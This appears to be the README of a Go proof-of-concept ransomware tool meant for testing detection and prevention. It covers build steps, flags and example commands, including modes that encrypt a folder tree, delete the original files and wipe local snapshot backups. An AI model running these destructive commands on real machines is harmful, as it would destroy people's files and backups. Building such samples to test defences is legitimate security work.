# Ransomwhere

A Proof of Concept ransomware sample that encrypts your files to test out your ransomware detection & prevention strategies.
If no arguments are provided, `ransomwhere`will automatically execute the `encrypt` mode without deleting the original files.

I am not responsible for any damage caused by this software.

## Building

```shell
# with make and Go installed
% make build
```


## Usage

```shell
% ransomwhere -h
Usage of ransomwhere:
  -delete
        Delete files after encrypting.
  -log string
        The log level to use. (default "error")
  -mode string
        Encrypt or decrypt the ransomware files. (default "encrypt")
  -path string
        Path to the directory where to traverse files to ransom. (default "/Users/niels")
  -wipe
        Wipe local snapshots while encrypting.
```

## Examples

```shell
# straight from source, encrypt in our home directory
% make FLAGS="-log=warn -delete=false -mode=encrypt"

# from the binary, encrypt /home/ransom/
% ./app -log=warn -delete=false -mode=encrypt -path=/home/ransom/

# encrypt, delete original files and wipe backups like a real ransomware (DANGEROUS)
% ./app -delete=true -wipe=true

# revert the ransom operation and restore any files
% ./app -mode=decrypt
```
